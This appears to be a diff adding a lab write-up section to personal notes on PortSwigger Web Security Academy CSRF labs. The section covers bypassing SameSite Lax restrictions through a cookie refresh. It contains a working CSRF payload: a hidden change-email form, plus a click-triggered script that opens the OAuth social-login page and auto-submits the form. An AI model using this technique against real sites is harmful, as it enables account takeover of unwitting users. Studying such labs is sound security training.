@@ -312,6 +312,27 @@ Bypassing SameSite Lax restrictions using GET requests
                             </script>
                           </body>
                         </html>
+
+                                                                                                            #  SameSite Lax bypass via cookie refresh
+ This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
+
+The lab supports OAuth-based login.
+
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwned@portswigger.net">
+</form>
+<p>Click anywhere on the page</p>
+<script>
+    window.onclick = () => {
+        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+        setTimeout(changeEmail, 5000);
+    }
+
+    function changeEmail() {
+        document.forms[0].submit();
+    }
+</script>
+
                         
                                     ## Validation of Referer can be circumvented
                
